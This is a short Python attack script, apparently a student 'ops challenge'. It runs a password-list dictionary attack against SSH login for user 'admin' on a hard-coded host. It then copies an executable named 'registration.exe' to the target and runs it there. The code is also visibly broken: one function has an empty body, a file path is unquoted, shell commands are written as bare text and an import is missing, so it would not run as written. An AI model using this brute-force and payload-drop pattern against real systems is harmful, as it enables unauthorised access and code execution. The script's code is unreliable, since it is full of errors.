#!/usr/bin/env python3
###########################
# Title: OpsChallenge16
# Author:Jeff Snyder
# Date: 26OCT2020
# Purpose: Dictionary attack against SSH connection
###########################

import smtplib
import itertools
import sys
import time
from pexpect import pxssh
import zipfile
from shutil import copyfile
from sys import exit
from scapy.all import *
import ipaddress

def encrypt():


def sniffNetwork():
    ipAddress='192.168.29.141'
    #sniff
    return ipAddress

# try password list to get the admin SSH password
def bruteForce(user, ipAddress):
    filepath =open(./passwordlist.txt)
    for i in filepath.readlines():
        secret=i.strip("\n")
        s=pxssh.pxssh()
        try:
            s.login(ipAddress, user, secret)
            return secret
            # break   
        except pxssh.ExceptionPxssh as e:
            time.sleep(1)  

# Transfer 
def transferFiles(user, ipAddress, password ):
    badfile ="C:\Users\IEUser\Downloads\registration.exe" #local machine
    os.system(scp badFile r"user@ipAddress:~\C:\Users\IEUser\Downloads\registration.exe") #transfer to remote machine
    try:
        s=pxssh.pxssh()
        s.login(ipAddress, user, password)
        s.sendline(cd location of file)
        s.sendline(registration.exe)
    except pxssh.Exception.Pxssh as e:
        time.sleep(1)

def main():
    # encrypt()
    user= "admin"
    ipAddress = sniffNetwork()
    password =bruteForce(user, ipAddress)
    transferFiles(user, ipAddress, password) 

main()